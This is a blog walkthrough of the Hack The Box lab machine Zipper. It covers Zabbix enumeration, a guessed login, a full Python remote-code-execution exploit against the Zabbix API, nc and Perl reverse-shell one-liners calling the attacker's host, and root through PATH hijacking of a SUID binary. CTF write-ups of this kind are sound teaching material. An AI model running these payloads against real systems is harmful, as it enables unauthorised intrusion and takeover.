<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Hack The Box - Zipper - 0xRick
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Analytics -->
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-97164925-2', 'auto');
ga('send', 'pageview');
</script>
<!-- End Google Analytics -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"></head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>0XRICK</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><h2 id="Hack-The-Box-Write-ups"><a href="#Hack-The-Box-Write-ups" class="headerlink" title="Hack The Box Write-ups"></a>Hack The Box Write-ups</h2><ul>
<li><a href="/hack-the-box/ai/">Hack The Box - AI</a></li>
<li><a href="/hack-the-box/player/">Hack The Box - Player</a></li>
<li><a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></li>
<li><a href="/hack-the-box/craft/">Hack The Box - Craft</a></li>
<li><a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></li>
<li><a href="/hack-the-box/wall/">Hack The Box - Wall</a></li>
<li><a href="/hack-the-box/heist/">Hack The Box - Heist</a></li>
<li><a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></li>
<li><a href="/hack-the-box/networked/">Hack The Box - Networked</a></li>
<li><a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a></li>
<li><a href="/hack-the-box/haystack/">Hack The Box - Haystack</a></li>
<li><a href="/hack-the-box/safe/">Hack The Box - Safe</a></li>
<li><a href="/hack-the-box/ellingson/">Hack The Box - Ellingson</a></li>
<li><a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></li>
<li><a href="/hack-the-box/ghoul">Hack The Box - Ghoul</a></li>
<li><a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></li>
<li><a href="/hack-the-box/kryptos/">Hack The Box - Kryptos</a></li>
<li><a href="/hack-the-box/luke/">Hack The Box - Luke</a></li>
<li><a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></li>
<li><a href="/hack-the-box/bastion-2/">Hack The Box - Bastion (Commando)</a></li>
<li><a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></li>
<li><a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></li>
<li><a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></li>
<li><a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></li>
<li><a href="/hack-the-box/fortune">Hack The Box - Fortune</a></li>
<li><a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></li>
<li><a href="/hack-the-box/ctf/">Hack The Box - CTF</a></li>
<li><a href="/c/categories/#Hack-The-Box"><strong>Older</strong></a></li>
</ul>
<h2 id="Wizard-Labs-Write-ups"><a href="#Wizard-Labs-Write-ups" class="headerlink" title="Wizard Labs Write-ups"></a>Wizard Labs Write-ups</h2><ul>
<li><a href="/wizard-labs/devlife/">Wizard Labs - Devlife</a></li>
<li><a href="/wizard-labs/dummy/">wizard Labs - Dummy</a></li>
</ul>
<h2 id="Basic-Binary-Exploitation"><a href="#Basic-Binary-Exploitation" class="headerlink" title="Basic Binary Exploitation"></a>Basic Binary Exploitation</h2><ul>
<li><a href="/binary-exploitation/bof6/">Bof: re2libc - protostar stack6</a></li>
<li><a href="/binary-exploitation/bof5/">Bof: ShellCode Injection - protostar stack5</a></li>
<li><a href="/binary-exploitation/bof4/">Bof: Taking control of the instruction pointer - protostar stack4</a></li>
<li><a href="/binary-exploitation/bof3/">Bof: Overwriting function pointers - protostar stack3</a></li>
<li><a href="/binary-exploitation/bof2/">Bof: Overwriting stack variables - protostar stack1,2</a></li>
<li><a href="/binary-exploitation/bof1/">Buffer Overflow Explained</a></li>
</ul>
<h2 id="Pwn-Challenges-Write-ups"><a href="#Pwn-Challenges-Write-ups" class="headerlink" title="Pwn Challenges Write-ups"></a>Pwn Challenges Write-ups</h2><ul>
<li><a href="/pwn/collision/">pwnable.kr - collision</a></li>
<li><a href="/pwn/bof/">pwnable.kr - bof</a></li>
<li><a href="/pwn/fd/">pwnable.kr - fd</a></li>
</ul>
<h2 id="Misc-CTF-Write-ups"><a href="#Misc-CTF-Write-ups" class="headerlink" title="Misc CTF Write-ups"></a>Misc CTF Write-ups</h2><ul>
<li><a href="/ctfs/egctf-qual/">EGCTF 2019 - Qualification Round</a></li>
</ul>
<h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><ul>
<li><a href="/lists/stego/">Steganography</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <div> <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script> </div> <br>
  <h1 id="Hack-The-Box-Zipper"><a href="#Hack-The-Box-Zipper" class="headerlink" title="Hack The Box - Zipper"></a>Hack The Box - Zipper</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys today Zipper retired and here’s my write-up. Owning user on this box was challenging because we have to exploit an RCE vulnerability which is not really easy and then we have to get a stable shell to be able to enumerate, for the privilege escalation it was easy but I also liked it because it was a binary exploitation. It was a very fun box and I liked it. It’s a linux box and its ip is <code>10.10.10.108</code> , I added it to <code>/etc/hosts</code> as <code>zipper.htb</code>. Let’s jump right in.<br><img src="/images/hackthebox/zipper/0.png" alt=""></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with nmap to scan for open ports and services :<br><code>nmap -sV -sT -sC zipper.htb</code><br><img src="/images/hackthebox/zipper/1.png" alt=""><br>We only get 2 ports , http on port 80 and ssh on port 22. so we are going to check http</p>
<h2 id="HTTP-enumeration"><a href="#HTTP-enumeration" class="headerlink" title="HTTP enumeration"></a>HTTP enumeration</h2><p>By visiting <code>zipper.htb</code> we get the default apache2 page :<br><img src="/images/hackthebox/zipper/2.png" alt=""><br>So I’m going to run <code>gobuster</code> with <code>directory-list-2.3-medium.txt</code> to see if there are any sub directories :<br><code>gobuster -u http://zipper.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code><br>Output :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v2.0.0              OJ Reeves (@TheColonial)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[+] Mode         : dir</span><br><span class="line">[+] Url&#x2F;Domain   : http:&#x2F;&#x2F;zipper.htb&#x2F;</span><br><span class="line">[+] Threads      : 100</span><br><span class="line">[+] Wordlist     : &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt</span><br><span class="line">[+] Status codes : 200,204,301,302,307,403</span><br><span class="line">[+] Timeout      : 4m10s</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2019&#x2F;02&#x2F;22 08:50:38 Starting gobuster</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;zabbix (Status: 301)</span><br></pre></td></tr></table></figure>
<p>We got <code>/zabbix</code> , let’s look at that in the browser :<br><img src="/images/hackthebox/zipper/3.png" alt=""><br>We get this login page , we don’t have credentials but down there there’s an option to sign in as a guest , but before we do that let’s get an idea about <code>zabbix</code></p>
<blockquote>
<p>Zabbix is an open-source monitoring software tool for diverse IT components, including networks, servers, virtual machines and cloud services. Zabbix provides monitoring metrics, among others network utilization, CPU load and disk space consumption. -<a href="https://en.wikipedia.org/wiki/Zabbix" target="_blank" rel="noopener">Wikipedia</a></p>
</blockquote>
<p>So basically it’s a server monitoring tool , let’s login as a guest and see what we can get<br><img src="/images/hackthebox/zipper/4.png" alt=""><br>We get this dashboard , but we are not privileged to do anything because we are <code>guest</code><br>After some enumeration we will notice in : Monitoring –&gt; Latest data , <code>Zapper&#39;s Backup Script</code><br><img src="/images/hackthebox/zipper/5.png" alt=""><br>Now we have a potential username :  <code>zapper</code> , we can try to brute force or fuzz the password , but a quick guess worked for me , the username is the password <code>zapper : zapper</code><br><img src="/images/hackthebox/zipper/6.png" alt=""></p>
<p><img src="/images/hackthebox/zipper/7.png" alt=""><br><code>GUI access disabled</code> , on exploit-db there’s an authenticated remote code execution exploit for an old version of zabbix , check it <a href="https://www.exploit-db.com/exploits/39937" target="_blank" rel="noopener">here</a> , Unfortunately valid credentials are not enough to exploit it , if we take a look here :<br><img src="/images/hackthebox/zipper/8.png" alt=""><br>We also need <code>hostid</code> , and to get that we need to get GUI access</p>
<h2 id="GUI-access-through-zabbix-cli"><a href="#GUI-access-through-zabbix-cli" class="headerlink" title="GUI access through zabbix-cli"></a>GUI access through zabbix-cli</h2><p>There’s a cli tool for zabbix on <a href="https://github.com/usit-gd/zabbix-cli" target="_blank" rel="noopener">github</a> , we can use it to gain GUI access. Installation and configuration is simple you will get the source from github then install it with <code>install.py install</code> then you will create a <code>conf</code> file for it by executing <code>zabbix-cli --config</code>, it will be saved in  <code>$HOME/.zabbix-cli/zabbix-cli.conf</code> , open the <code>conf</code> file and in Zabbix API section add this line :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zabbix_api_url&#x3D;http:&#x2F;&#x2F;10.10.10.108&#x2F;zabbix</span><br></pre></td></tr></table></figure>
<p>For details read the documentation <a href="https://github.com/usit-gd/zabbix-cli/blob/master/docs/manual.rst#installing-from-source" target="_blank" rel="noopener">here</a><br>Then we will run <code>zabbix-cli</code> it will ask for a username and a password , we already have them <code>zapper : zapper</code><br>if we executed <code>show_usergroups</code> we will see that <code>zapper</code> is in a group called <code>No access to the fronted</code> and GUI access to that group is disabled<br><img src="/images/hackthebox/zipper/9.png" alt=""><br>We will create a new group and call it <code>guiaccess</code> and leave GUI access as system default<br><code>create_usergroup</code><br><img src="/images/hackthebox/zipper/10.png" alt=""><br>Then we will add <code>zapper</code> to that group and delete him from <code>No access to the fronted</code><br><code>add_user_to_usergroup</code><br><img src="/images/hackthebox/zipper/11.png" alt=""><br><code>remove_user_from_usergroup</code><br><img src="/images/hackthebox/zipper/12.png" alt=""><br>Now if we try to login again as <code>zapper</code> we will get the dashboard :<br><img src="/images/hackthebox/zipper/13.png" alt=""></p>
<h2 id="RCE-and-getting-user"><a href="#RCE-and-getting-user" class="headerlink" title="RCE and getting user"></a>RCE and getting user</h2><p>From Configuration –&gt; Hosts we have 2 hosts and the second one is the availabe one :<br><img src="/images/hackthebox/zipper/14.png" alt=""><br>If we click on it we will get an edit page , but we will notice that the <code>host id</code> is included in the url as a GET parameter :<br><img src="/images/hackthebox/zipper/15.png" alt=""><br>Now we can edit the python exploit and add the host id : <code>10106</code> , this is how the basic login info in the script will look like :<br><img src="/images/hackthebox/zipper/16.png" alt=""></p>
<p><img src="/images/hackthebox/zipper/17.png" alt=""><br>And we get a decent shell , but this shell executes commands through API requests which is not efficient , so we will get a reverse shell like this :<br><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f</code><br>I got this shell from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" target="_blank" rel="noopener">payload all the things</a><br><img src="/images/hackthebox/zipper/18.png" alt=""></p>
<p><img src="/images/hackthebox/zipper/19.png" alt=""><br>Problem is , we will find that we are in a docker container , and that’s actually a bad rabbit hole and when I was doing this box for the first time i spent a lot of time trying to escape this docker container , And eventually i found out that this is the wrong server.<br><img src="/images/hackthebox/zipper/20.png" alt=""><br>If we take a look at <a href="https://www.zabbix.com/documentation/3.0/manual/api/reference/script/object" target="_blank" rel="noopener">this page</a> from zabbix documentation , this part :<br><img src="/images/hackthebox/zipper/21.png" alt=""><br>there’s an option called <code>execute_on</code> , which has 2 possible values : <code>0</code> to execute on zabbix agent , and <code>1</code> to execute on zabbix server. We don’t have that option included in the exploit so we are using the default option <code>1</code> which means we are executing commands on zabbix server. So we will edit the exploit json data and add <code>&quot;execute_on&quot; : &quot;0&quot;</code> in those 2 parts :<br><img src="/images/hackthebox/zipper/22.png" alt=""></p>
<p><img src="/images/hackthebox/zipper/23.png" alt=""><br>After that we will run the exploit again and now it will run on the right server , however the shell that we used before didn’t work and died immediately because the exploit crashed for some reason , I had to comment out the last line which prints the result : <code>print cmd_exe[&quot;result&quot;][&quot;value&quot;]</code> , but it didn’t fix it , so I tried some other shells and the <code>perl</code> one worked :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;10.10.xx.xx&quot;;$p&#x3D;1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure>
<p>Then I used used <code>python3</code> pty to get a proper shell , python2 didn’t exist on the server<br><img src="/images/hackthebox/zipper/24.png" alt=""></p>
<h2 id="Final-exploit-after-edits"><a href="#Final-exploit-after-edits" class="headerlink" title="Final exploit after edits :"></a>Final exploit after edits :</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit Title: Zabbix RCE with API JSON-RPC</span></span><br><span class="line"><span class="comment"># Date: 06-06-2016</span></span><br><span class="line"><span class="comment"># Exploit Author: Alexander Gurin</span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://www.zabbix.com</span></span><br><span class="line"><span class="comment"># Software Link: http://www.zabbix.com/download.php</span></span><br><span class="line"><span class="comment"># Version: 2.2 - 3.0.3</span></span><br><span class="line"><span class="comment"># Tested on: Linux (Debian, CentOS)</span></span><br><span class="line"><span class="comment"># CVE : N/A</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> readline</span><br><span class="line"></span><br><span class="line">ZABIX_ROOT = <span class="string">'http://10.10.10.108/zabbix'</span>	<span class="comment">## Zabbix IP-address</span></span><br><span class="line">url = ZABIX_ROOT + <span class="string">'/api_jsonrpc.php'</span>	<span class="comment">## Don't edit</span></span><br><span class="line"></span><br><span class="line">login = <span class="string">'zapper'</span>		<span class="comment">## Zabbix login</span></span><br><span class="line">password = <span class="string">'zapper'</span>	<span class="comment">## Zabbix password</span></span><br><span class="line">hostid = <span class="string">'10106'</span>	<span class="comment">## Zabbix hostid</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## auth</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">"jsonrpc"</span> : <span class="string">"2.0"</span>,</span><br><span class="line">    <span class="string">"method"</span> : <span class="string">"user.login"</span>,</span><br><span class="line">    <span class="string">"params"</span>: &#123;</span><br><span class="line">    	<span class="string">'user'</span>: <span class="string">""</span>+login+<span class="string">""</span>,</span><br><span class="line">    	<span class="string">'password'</span>: <span class="string">""</span>+password+<span class="string">""</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"auth"</span> : <span class="literal">None</span>,</span><br><span class="line">    <span class="string">"id"</span> : <span class="number">0</span>,</span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'content-type'</span>: <span class="string">'application/json'</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">auth  = requests.post(url, data=json.dumps(payload), headers=(headers))</span><br><span class="line">auth = auth.json()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	cmd = raw_input(<span class="string">'\033[41m[zabbix_cmd]&gt;&gt;: \033[0m '</span>)</span><br><span class="line">	<span class="keyword">if</span> cmd == <span class="string">""</span> : <span class="keyword">print</span> <span class="string">"Result of last command:"</span></span><br><span class="line">	<span class="keyword">if</span> cmd == <span class="string">"quit"</span> : <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## update</span></span><br><span class="line">	payload = &#123;</span><br><span class="line">		<span class="string">"jsonrpc"</span>: <span class="string">"2.0"</span>,</span><br><span class="line">		<span class="string">"method"</span>: <span class="string">"script.update"</span>,</span><br><span class="line">		<span class="string">"params"</span>: &#123;</span><br><span class="line">		    <span class="string">"scriptid"</span>: <span class="string">"1"</span>,</span><br><span class="line">		    <span class="string">"command"</span>: <span class="string">""</span>+cmd+<span class="string">""</span>,</span><br><span class="line">		    <span class="string">"execute_on"</span> : <span class="string">"0"</span></span><br><span class="line">		&#125;,</span><br><span class="line">		<span class="string">"auth"</span> : auth[<span class="string">'result'</span>],</span><br><span class="line">		<span class="string">"id"</span> : <span class="number">0</span>,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	cmd_upd = requests.post(url, data=json.dumps(payload), headers=(headers))</span><br><span class="line"></span><br><span class="line"><span class="comment">## execute</span></span><br><span class="line">	payload = &#123;</span><br><span class="line">		<span class="string">"jsonrpc"</span>: <span class="string">"2.0"</span>,</span><br><span class="line">		<span class="string">"method"</span>: <span class="string">"script.execute"</span>,</span><br><span class="line">		<span class="string">"params"</span>: &#123;</span><br><span class="line">		    <span class="string">"scriptid"</span>: <span class="string">"1"</span>,</span><br><span class="line">		    <span class="string">"hostid"</span>: <span class="string">""</span>+hostid+<span class="string">""</span></span><br><span class="line">		&#125;,</span><br><span class="line">		<span class="string">"auth"</span> : auth[<span class="string">'result'</span>],</span><br><span class="line">		<span class="string">"id"</span> : <span class="number">0</span>,</span><br><span class="line">		<span class="string">"execute_on"</span> : <span class="string">"1"</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	cmd_exe = requests.post(url, data=json.dumps(payload), headers=(headers))</span><br><span class="line">	cmd_exe = cmd_exe.json()</span><br><span class="line"><span class="comment">#	print cmd_exe["result"]["value"]</span></span><br></pre></td></tr></table></figure>
<p>First thing we will notice that we are <code>zabbix</code> and in <code>/home</code> there’s a directory for the user <code>zapper</code><br><img src="/images/hackthebox/zipper/25.png" alt=""><br>We can’t read <code>user.txt</code> and we can’t go into <code>.ssh</code><br><img src="/images/hackthebox/zipper/26.png" alt=""><br>There’s another directory called <code>utils</code> which contains 2 files , <code>backup.sh</code> and <code>zabbix-service</code><br><code>cat backup.sh</code><br><img src="/images/hackthebox/zipper/28.png" alt=""><br>We see that it has a hardcoded password in it : <code>ZippityDoDah</code> , we can try to <code>su</code> to zapper with that password<br><img src="/images/hackthebox/zipper/29.png" alt=""><br>And it worked , now we can get the ssh key from <code>.ssh</code> and have ssh connection<br><img src="/images/hackthebox/zipper/30.png" alt=""><br><img src="/images/hackthebox/zipper/31.png" alt=""><br>And we owned user !</p>
<h2 id="Privilege-Escalation-and-getting-root"><a href="#Privilege-Escalation-and-getting-root" class="headerlink" title="Privilege Escalation and getting root"></a>Privilege Escalation and getting root</h2><p>If we take a look at the <code>utils</code> directory again and execute <code>zabbix-service</code> :<br><img src="/images/hackthebox/zipper/32.png" alt=""><br><img src="/images/hackthebox/zipper/33.png" alt=""><br>It asks us start or stop? then it executes something and exits , we will check if that binary is a suid binary :<br><code>find /home/zapper/utils -perm -4000</code><br><img src="/images/hackthebox/zipper/34.png" alt=""><br>It’s a suid binary , we need to know what is it doing. Without reverse engineering , <code>strings</code> was enough :<br><code>strings zabbix-service</code><br><img src="/images/hackthebox/zipper/35.png" alt=""><br>This command is being executed when we type <code>start</code> : <code>systemctl daemon-reload &amp;&amp; systemctl start zabbix-agent</code> , so what are we going to do is the same as we did in <a href="/hack-the-box/dab/">Dab</a> , the only difference is in dab we hijacked a shared library that the binary used , but here we will hijack a binary. By default <code>systemctl</code> points to <code>/bin/systemctl</code><br><img src="/images/hackthebox/zipper/36.png" alt=""><br>We will create a <code>c</code> program to execute <code>/bin/bash</code> :<br><img src="/images/hackthebox/zipper/37.png" alt=""><br>Then we will compile it with gcc : <code>gcc exploit.c -o systemctl</code><br>Now we have our fake binary ready :<br><img src="/images/hackthebox/zipper/38.png" alt=""><br>We will add <code>/home/zapper/utils</code> as the first entry in <code>PATH</code> env variable , so the system will look there first :<br><code>export PATH=/home/zapper/utils:$PATH</code><br>This is changing the <code>PATH</code> variable to <code>/home/zapper/utils:</code> + the old path<br><img src="/images/hackthebox/zipper/39.png" alt=""><br>Now <code>systemctl</code> points to our fake binary , let’s run <code>zabbix-service</code> :<br><img src="/images/hackthebox/zipper/40.png" alt=""><br>And we owned root !</p>
<p>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p>
<p>Previous Hack The Box write-up : <a href="/hack-the-box/giddy/">Hack The Box - Giddy</a><br>Next Hack The Box write-up : <a href="/hack-the-box/access/">Hack The Box - Access</a></p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>0xRick</div>
      <div>2019-02-23</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>

      <a class="tag-link" href="/tags/binary-exploitation/" rel="tag">#binary-exploitation</a> <a class="tag-link" href="/tags/c/" rel="tag">#c</a> <a class="tag-link" href="/tags/exploit-development/" rel="tag">#exploit-development</a> <a class="tag-link" href="/tags/linux/" rel="tag">#linux</a> <a class="tag-link" href="/tags/python/" rel="tag">#python</a> <a class="tag-link" href="/tags/rce/" rel="tag">#rce</a> <a class="tag-link" href="/tags/web/" rel="tag">#web</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
